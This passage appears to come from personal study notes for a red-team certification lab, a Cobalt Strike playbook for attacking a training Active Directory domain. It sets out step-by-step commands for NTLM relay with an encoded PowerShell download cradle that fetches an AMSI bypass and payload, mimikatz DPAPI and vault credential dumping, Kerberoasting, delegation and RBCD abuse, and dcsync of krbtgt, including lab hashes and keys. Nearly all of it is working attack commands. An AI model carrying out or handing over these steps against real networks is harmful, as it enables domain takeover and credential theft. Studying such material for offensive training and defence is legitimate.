beacon&gt; rportfwd 8080 127.0.0.1 80
beacon&gt; rportfwd 8445 127.0.0.1 445

<span style=color:#75715e># 3. Setup SOCKS Proxy on the beacon</span>
beacon&gt; socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

<span style=color:#75715e># 4. Setup Proxychains to use this proxy</span>
$ sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

<span style=color:#75715e># 5. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution</span>
$ sudo proxychains ntlmrelayx.py -t smb<span style=color:#960050;background-color:#1e0010>:</span>//10.10.122.10 -smb2support --no-http-server --no-wcf-server -c <span style=color:#e6db74>&#39;powershell -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBhAG0AcwBpAC0AYgB5AHAAYQBzAHMALgBwAHMAMQAiACkAOwBpAGUAeAAgACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGIAIgApAA==&#39;</span>
<span style=color:#75715e># IEX (new-object net.webclient).downloadstring(&#34;http://wkstn-2:8080/amsi-bypass.ps1&#34;);iex (new-object net.webclient).downloadstring(&#34;http://wkstn-2:8080/b&#34;)</span>
<span style=color:#75715e># Where is the wkstn-2 IP.</span>
<span style=color:#75715e># 10.10.122.10 is the IP address of dc-2.dev.cyberbotic.io, which is our target.</span>
<span style=color:#75715e># The encoded command is a download cradle pointing at http://10.10.123.102:8080/b, and /b is an SMB payload.</span>

<span style=color:#75715e># 6. Upload PortBender driver and load its .cna file (Cobalt Strike &gt; Script Manager and load PortBender.cna from C:\Tools\PortBender)</span>
beacon&gt; cd C:\Windows\system32\drivers
beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
beacon&gt; PortBender redirect 445 8445

<span style=color:#75715e># 7. Manually try to access share on our system or use MSPRN, Printspooler to force authentication (Refer to Notes)</span>
<span style=color:#75715e># Manually triggering the attack (Usin a console of Wkstn-1 as nlamb user to make authentication attempt on wkstn-2.)</span>
C:\Users\nlamb&gt;hostname
wkstn-1
C:\Users\nlamb&gt;dir \\10.10.123.102\relayme
C:\Users\nlamb&gt;dir \\wkstn-2\relayme
<span style=color:#75715e># 8. Verify the access in weblog and use link command to connect with SMB beacon</span>
beacon&gt; link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
</code></pre></div><h3 id=data-protection-api-dpapi>Data Protection API (DPAPI)</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Use mimikatz to dump secrets from windows vault</span>
beacon&gt; mimikatz !vault::list
beacon&gt; mimikatz !vault::cred /patch

<span style=color:#75715e># Part 1: Enumerate stored credentials, Make sure to enumerate as both Admin and Domain User in a machine.</span>
<span style=color:#75715e># 0. Check if system has credentials stored in either web or windows vault</span>
beacon&gt; run vaultcmd /list
beacon&gt; run vaultcmd /listcreds<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Windows Credentials</span><span style=color:#e6db74>&#34;</span> /all
beacon&gt; run vaultcmd /listcreds<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Web Credentials</span><span style=color:#e6db74>&#34;</span> /all
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

<span style=color:#75715e># Part 2.1: Scheduled Task Credentials</span>
<span style=color:#75715e># 0. Before manually trying to extract Credentials try below command ones which is equivalent of the below commands and gives same.</span>
beacon&gt; mimikatz !vault::cred /patch
<span style=color:#75715e># 1. Credentials for task scheduler are stored at below location in encrypted blob</span>
beacon&gt; ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
<span style=color:#75715e># 2. Find the GUID (guidMasterKey) of Master key associated with encrypted blob (F31...B6E)</span>
beacon&gt; mimikatz dpapi::cred /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
<span style=color:#75715e># 3. Dump all the master keys and filter the one we need based on GUID identified in previous step</span>
beacon&gt; mimikatz !sekurlsa::dpapi
<span style=color:#75715e># 4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password</span>
beacon&gt; mimikatz dpapi::cred /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey<span style=color:#960050;background-color:#1e0010>:</span>10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

<span style=color:#75715e># Part 2.2: Extracting stored RDP Password</span>

<span style=color:#75715e># 0. Verify if any credentials are stored or not</span>
beacon&gt; run vaultcmd /list
beacon&gt; run vaultcmd /listcreds<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Windows Credentials</span><span style=color:#e6db74>&#34;</span> /all
beacon&gt; run vaultcmd /listcreds<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Web Credentials</span><span style=color:#e6db74>&#34;</span> /all
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

<span style=color:#75715e># 1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)</span>
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

<span style=color:#75715e># 2. Verify the credential blob in users cred directory (Note enc blob ID)</span>
beacon&gt; ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

<span style=color:#75715e># 3. Master keys are stored in the users&#39; roaming &#34;Protect&#34; directory (Note GUID of master key matching with Seatbelt)</span>
beacon&gt; ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

<span style=color:#75715e># 4. Decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob. (Need to be execute in context of user who owns the key, use @ modifier)</span>
<span style=color:#75715e># Requires Elevation or interaction with LSASS</span>
beacon&gt; mimikatz !sekurlsa::dpapi
<span style=color:#75715e># Does not requires elevation or interaction with LSASS (Check last lines with &#34;domainkey with RPC&#34; line)</span>
beacon&gt; mimikatz dpapi::masterkey /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

<span style=color:#75715e># 5. Use Master key to decrypt the credentials blob</span>
beacon&gt; mimikatz dpapi::cred /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey<span style=color:#960050;background-color:#1e0010>:</span>8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
</code></pre></div><h3 id=kerberos>Kerberos</h3><ul><li><p>Kerberoasting / ASREPRoasting</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Kerberosting</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(servicePrincipalName=*))</span><span style=color:#e6db74>&#34;</span> --attributes cn,servicePrincipalName,samAccountName
<span style=color:#75715e># To avoid Honeypot accounts, few enumerations can be performed</span>
beacon&gt; powerpick Get-DomainUser -Identity mssql_svc,squid_svc,honey_svc | select samaccountname,logoncount,badpasswordtime,lastlogontimestamp,lastlogoff,lastlogon,badpwdcount,whencreated,pwdlastset
  
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user<span style=color:#960050;background-color:#1e0010>:</span>mssql_svc,squid_svc /nowrap
  
ps&gt; hashcat -a 3 -m 13100 hashes wordlist
<span style=color:#75715e># I experienced some hash format incompatibility with john.  Removing the SPN so it became: $krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah] seemed to address the issue.</span>
ps&gt; john --format=krb5tgs --wordlist=wordlist mssql_svc
  
<span style=color:#75715e># ASREPRoast</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</span><span style=color:#e6db74>&#34;</span> --attributes cn,distinguishedname,samaccountname
<span style=color:#75715e># To avoid Honeypot accounts, few enumerations can be performed</span>
beacon&gt; powerpick Get-DomainUser -Identity mssql_svc,squid_svc,honey_svc | select samaccountname,logoncount,badpasswordtime,lastlogontimestamp,lastlogoff,lastlogon,badpwdcount,whencreated,pwdlastset
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user<span style=color:#960050;background-color:#1e0010>:</span>squid_svc /nowrap
  
ps&gt; hashcat -a 3 -m 18200 svc_oracle wordlist
ps&gt; john --format=krb5asrep --wordlist=wordlist squid_svc
</code></pre></div></li><li><p>Unconstrained Delegation</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Unconstrained Delegation (Caches TGT of any user accessing its service)</span>
  
<span style=color:#75715e># 1. Identify the computer objects having Unconstrained Delegation enabled</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><span style=color:#e6db74>&#34;</span> --attributes samaccountname,dnshostname
  
<span style=color:#75715e># 2. Dumping the cached TGT ticket (requires system access on affected system)</span>
beacon&gt; getuid
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid<span style=color:#960050;background-color:#1e0010>:</span>0x14794e /nowrap
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval<span style=color:#960050;background-color:#1e0010>:</span>10 /nowrap
  
<span style=color:#75715e># 3. Execute PrintSpool attack to force DC to authenticate with WEB </span>
beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
  
<span style=color:#75715e># 4 (a). For MACHINE TGT : Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)</span>
<span style=color:#75715e># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span>
<span style=color:#75715e># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span>
  
<span style=color:#75715e># Generate TGS from TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP
<span style=color:#75715e># Inject TGS in a sacrificial process</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
  
<span style=color:#75715e># 4 (b). For DOMAIN USER TGT : Inject the ticket and access the service.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
</code></pre></div></li><li><p>Constrained Delegation</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Constrained Delegation (allows to request TGS for any user using its TGT)</span>
  
<span style=color:#75715e># 1. Identify the computer/User objects having Constrained Delegation is enabled</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(msds-allowedtodelegateto=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
  
<span style=color:#75715e># 2 (a). Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt or NTLM hash)</span>
beacon&gt; getuid
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid<span style=color:#960050;background-color:#1e0010>:</span>0x3e7 /service<span style=color:#960050;background-color:#1e0010>:</span>krbtgt /nowrap
<span style=color:#75715e># 2 (b). Using Machine/User NTLM Hash to generate TGT.</span>
beacon&gt; mimikatz !sekurlsa::logonpasswords
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>sql-2$ /rc4<span style=color:#960050;background-color:#1e0010>:</span>49d47d3af2329a410e6510a7ccd535c3 /nowrap
  
<span style=color:#75715e># 3 (a). Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy tkt)</span>
<span style=color:#75715e># /impersonateuser - Impersonating Domain Admin , So check the domain admins and use that. (in lab - nlamb, Administrator)</span>
beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Admins</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
  
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /msdsspn<span style=color:#960050;background-color:#1e0010>:</span>CIFS/dc-2.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>sql-2$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFLD[...snip...]MuSU8=
  
<span style=color:#75715e># 3 (b). OR, Access other alternate Service not stated in Delegation attribute (ldap, http, host, etc...)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /msdsspn<span style=color:#960050;background-color:#1e0010>:</span>CIFS/dc-2.dev.cyberbotic.io /altservice<span style=color:#960050;background-color:#1e0010>:</span>LDAP /nowrap /user<span style=color:#960050;background-color:#1e0010>:</span>sql-2$ /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFpD[...]MuSU8=
  
<span style=color:#75715e># STEP 2 &amp; 3 in one command using Credentials (Getting TGT and from TGT requesting TGS for Alternative Service)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user<span style=color:#960050;background-color:#1e0010>:</span>SQL-2$ /rc4<span style=color:#960050;background-color:#1e0010>:</span>49d47d3af2329a410e6510a7ccd535c3 /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /msdsspn<span style=color:#960050;background-color:#1e0010>:</span>CIFS/dc-2.dev.cyberbotic.io /altservice<span style=color:#960050;background-color:#1e0010>:</span>LDAP /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /dc<span style=color:#960050;background-color:#1e0010>:</span>dc-2.dev.cyberbotic.io /nowrap
  
<span style=color:#75715e># 4. Inject the TGS from previous step (In attacker machine or Initial Machine)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIGaD[...]ljLmlv
  
<span style=color:#75715e># 5. Access the services </span>
beacon&gt; steal_token 5540
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt
  
<span style=color:#75715e># Note: Directory Listing \\dc-2.dev.cyberbotic.io\c$ worked when impersonating &#39;nlamb&#39; Domain Admin , But not worked with &#39;Administrator&#39; Domain Admin in the CRTO Lab Environment.</span>
</code></pre></div></li><li><p>S4U2Self Abuse</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># S4U2Self Abuse can be Used to get TGS from TGT of a Machine Account.</span>
<span style=color:#75715e># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span>
<span style=color:#75715e># To Generate TGS from TGT or (TGT, RC4 or AES hash of machine account)</span>
  
<span style=color:#75715e># Get the TGT</span>
<span style=color:#75715e># Using Credentials or Dump it from machine or use PrintSpool attack (force DC to authenticate with WEB machine with unconstrained Delegation Enabled)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>Administrator /rc4<span style=color:#960050;background-color:#1e0010>:</span>c04d18e6ff38ae05ed3747274c82b07e /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /nowrap
  
beacon&gt; mimikatz !sekurlsa::tickets
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid<span style=color:#960050;background-color:#1e0010>:</span>0x14794e /nowrap
  
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval<span style=color:#960050;background-color:#1e0010>:</span>10 /nowrap
beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
  
<span style=color:#75715e># Inject the TGT into a sacrificial Process and then try to access the machine share. You will get the error.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /ticket<span style=color:#960050;background-color:#1e0010>:</span>&lt;TGT-TICKET&gt;
  
beacon&gt; steal_token 7656
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
  
<span style=color:#75715e># Now Perform the S4U2Self Abuse to get the TGS from the injected TGT in the sacrificial process and use rubeus /ptt to directly pass the ticket to the sacrificial process. (Run it within Sacrificial Process)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>Administrator /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /self /nowrap /ptt /ticket<span style=color:#960050;background-color:#1e0010>:</span>&lt;TGT-TICKET&gt;
beacon&gt; run klist
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
</code></pre></div></li><li><p>RBCD</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)</span>
<span style=color:#75715e># RBCD can be configured to both Domain Machines objects and Domain User Objects, So enumerate both.</span>
  
<span style=color:#75715e># CASE-1 : Have Local Admin Access to any Domain Joined Machine.</span>
  
<span style=color:#75715e>#1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
  
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
  
<span style=color:#75715e>#2. OR, Identify the Domain Computer where we have WriteProperty, GenericAll, GenericWrite or WriteDacl and can write this atribute with custom value.</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainSid -Domain dev.cyberbotic.io
  
beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span>}
  
beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.SecurityIdentifier <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}</span><span style=color:#e6db74>&#34;</span> }
  
beacon&gt; powerpick Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.SecurityIdentifier <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}</span><span style=color:#e6db74>&#34;</span> }
  
beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Developers</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
  
<span style=color:#75715e>#3. Set the delegation attribute to a Computer Account where we have local admin access by modifying the attribute of target system</span>
<span style=color:#75715e># If we do not have Local Admin Access to any computer and only have User access then we can create Computer Object and Use it to abuse RBCD. Check Case-2.</span>
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
beacon&gt; powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)</span><span style=color:#e6db74>&#34;</span>; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>dc-2</span><span style=color:#e6db74>&#34;</span> | Set-DomainObject -Set @{<span style=color:#e6db74>&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;</span> = $rsdb} -Verbose
  
<span style=color:#75715e>#4. Verify the updated attribute</span>
beacon&gt; powerpick Get-DomainComputer -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>dc-2</span><span style=color:#e6db74>&#34;</span> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
  
<span style=color:#75715e>#5. Get the TGT of our computer</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid<span style=color:#960050;background-color:#1e0010>:</span>0x3e4 /service<span style=color:#960050;background-color:#1e0010>:</span>krbtgt /nowrap
  
<span style=color:#75715e>#6. Use S4U technique to get TGS for target computer using our TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user<span style=color:#960050;background-color:#1e0010>:</span>WKSTN-2$ /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /msdsspn<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuD[...]5JTw== /nowrap
  
<span style=color:#75715e>#7. Access the services</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIGcD[...]MuaW8=
  
beacon&gt; steal_token 4092
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
  
<span style=color:#75715e>#8. Remove the delegation rights</span>
beacon&gt; powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
  
<span style=color:#75715e># CASE-2 : Have Access to a Domain User but not Local Admin on Domain Joined Machine</span>
<span style=color:#75715e># Create Fake computer Account for RBCD Attack</span>
  
<span style=color:#75715e>#1. Check if we have permission to create computer account (default allowed)</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainObject -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> -Properties ms-DS-MachineAccountQuota
  
<span style=color:#75715e>#2. Create a fake computer with random password and then generate password hash using Rubeus</span>
<span style=color:#75715e># If You wants to create a new computer object for a different Forest using StandIn Tool, Then Read this blog by Rasta - https://rastamouse.me/getdomain-vs-getcomputerdomain-vs-getcurrentdomain/</span>
<span style=color:#75715e># Note: StandIn code needs to be modified if you wants to create a Computer in another Domain using --Domain parameter. (https://github.com/FuzzySecurity/StandIn/pull/17)</span>
beacon&gt; execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make --Domain dev.cyberbotic.io 
  
